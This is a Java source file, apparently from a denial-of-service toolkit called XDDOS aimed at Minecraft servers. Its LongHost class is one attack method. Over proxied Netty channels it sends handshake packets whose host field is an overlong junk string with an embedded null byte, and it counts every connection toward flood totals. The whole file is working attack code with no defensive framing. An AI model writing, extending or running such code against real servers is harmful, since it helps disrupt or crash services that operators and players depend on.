package XD.XDDOS.methods.impl;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class LongHost implements IMethod {
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new Handshake(XDDOS.protcolID, "8dCiJ7SpMGW4VTklNf5JhH3LkjvMU3DnVetPR0HEV8OQpCxDuwjWqHbve2L81UsKhrOyUh9y6tOj7hiH5tfkF4tw6dr1A0JtNasoJl2TzDe0WSle3sZRnsu05e0YUUQgasgdfgeqtGKAVGFKUWFVEHYKuVBYUKFWBYVUYBHKBKJHBBBHBHVGVJCKHGCV4TFN1pv2QsI1xHUXLReNgM13ft9GSq1EdhLdPykZpA9SCQEeb3Z8wy6gnK6g5HVT0IaUaLdyyhfytkcyghhvgcghjghjbvghbghjjyutdxcvbjhuytrdfcgjvhkcxuFKthbpLvxV6cYMH2sC5gB6utTLYI6tvjGE.\0008dCiJ7SpMG.", XDDOS.port, 2)).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }
}
